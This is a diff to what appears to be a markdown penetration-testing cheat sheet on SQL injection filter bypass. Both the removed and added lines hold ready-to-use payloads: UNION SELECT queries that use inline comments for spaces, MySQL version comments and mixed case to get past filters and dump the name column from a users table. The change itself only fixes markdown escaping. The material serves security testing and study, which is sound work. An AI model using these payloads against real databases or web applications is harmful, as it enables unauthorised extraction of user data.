@@ -790,11 +790,11 @@ https://github.com/danielmiessler/SecLists/blob/master/Discovery/Web-Content/bur
 
 #### Add comment /* */ for space bypass
 
-`'UNION/\*\*/SELECT/\*\*/1,name,3,4/**/from/**/users; -- -`
+`'UNION/**/SELECT/**/1,name,3,4/**/from/**/users; -- -`
 
-#### Add comment /\*!\*/ in query for filters bypass
+#### Add comment /*! */ in query for filters bypass
 
-`'/\*!UNION SELECT\*/ 1,group_concat(name),3,4 from users; -- -`
+`'/*!UNION SELECT*/ 1,group_concat(name),3,4 from users; -- -`
 
 #### Add random case
 
@@ -802,7 +802,7 @@ https://github.com/danielmiessler/SecLists/blob/master/Discovery/Web-Content/bur
 
 #### Example of mix:
 
-`'/\*!UnIoN/\*\*/SeLeCt/\*\*/\*/1,GroUp_ConCat(nAmE),3,4/\*\*/FrOm/\*\*/users; -- -`
+`'/*!UnIoN/**/SeLeCt/**/1,GroUp_ConCat(nAmE),3,4/**/FrOm/**/users; -- -`
 
 #### Other Techniques:
 
